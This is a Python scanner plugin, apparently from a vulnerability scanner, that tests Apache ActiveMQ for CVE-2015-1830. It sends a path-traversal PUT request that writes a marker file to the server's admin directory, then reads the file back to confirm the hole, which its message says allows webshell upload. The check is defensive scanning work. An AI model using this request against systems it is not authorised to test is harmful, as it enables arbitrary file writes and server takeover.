#!/usr/bin/python
# -*- coding: utf-8 -*-
import random
import time

from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1


def run_domain(http, ob):
    '''
    CNNVD ID:  CNNVD-201508-430
    CVE ID:  CVE-2015-1830
    ActiveMQ unauthenticated RCE
    CVSS分值:	5	[中等(MEDIUM)]
    CWE-22	[对路径名的限制不恰当（路径遍历）]
    '''
    try:
        scheme = ob['scheme']
        timeout = ob.get('webTimeout')

        ip = ob['ip']
        source_ip = ob.get('source_ip')
        if source_ip:
            ip = source_ip
        # print 1111111111111, 'source_ip:', source_ip
        port = '80'
        result = []

        if scheme == 'https':
            port = '443'

        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        filename = random_str(6)
        flag = "PUT /fileserver/sex../../..\\admin/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nYunDunScan0\r\n\r\n" % (
        filename)
        s.send(flag)
        time.sleep(1)
        s.recv(1024)
        s.close()
        url = 'http://' + ip + ":" + str(port) + '/admin/%s.txt' % (filename)
        header = {
            "Host": ob['domain']
        }
        res, content = http.request(url, 'GET', headers=header)

        if 'YunDunScan0' in content:
            response = getResponse(res, content, keywords='YunDunScan0')
            request = getRequest(url, headers=header, domain=ob['domain'])
            detail = u"存在任意文件上传漏洞，" + flag + u"CVE-2015-1830，攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器"
            result.append(getRecord(ob, url, ob['level'], detail, request, response))
            return result

    except Exception, e:
        logger.error("File:activemq_upload_domain.py, run_domain function :%s" % (str(e)))
        return []
